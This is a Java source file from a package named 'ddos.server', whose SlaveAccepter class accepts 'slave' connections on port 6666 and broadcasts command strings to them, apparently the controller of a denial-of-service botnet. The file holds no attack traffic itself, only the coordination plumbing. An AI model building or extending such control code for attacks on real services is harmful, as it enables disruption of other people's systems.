/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package ddos.server;

import java.io.IOException;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author bruno
 */
public class SlaveAccepter implements Runnable {

    private ArrayList<Socket> slaves;
    private Master m;
    private ServerSocket srv;

    SlaveAccepter(Master m) {
        this.slaves = new ArrayList<Socket>();
        this.m = m;
    }

    @Override
    public void run() {
        System.out.println("SlaveAccepter - THREAD - START");

        try {
            this.srv = new ServerSocket(6666);
            while (!this.srv.isClosed()) {
                Socket s = this.srv.accept();
                System.out.println("new slave");
                this.slaves.add(s);
            }

            srv.close();
        } catch (Exception ex) {
            if (!this.m.isClosing()) {
                Logger.getLogger(Master.class.getName()).log(Level.SEVERE, null, ex);
            }
        } finally {
            System.out.println("SlaveAccepter - THREAD - END");
        }
    }

    public void send(String s) {
        Iterator<Socket> it = this.slaves.iterator();
        System.out.println("Send: " + s);
        while (it.hasNext()) {    
            Socket skt  =  it.next();
            if (skt.isClosed())
                continue;
            try {
                OutputStream os = skt.getOutputStream();
                os.write(s.length());
                os.write(s.getBytes());
                os.flush();
            } catch (Exception ex) {
                Logger.getLogger(Master.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }

    public void close() throws IOException {
        this.srv.close();
    }
}
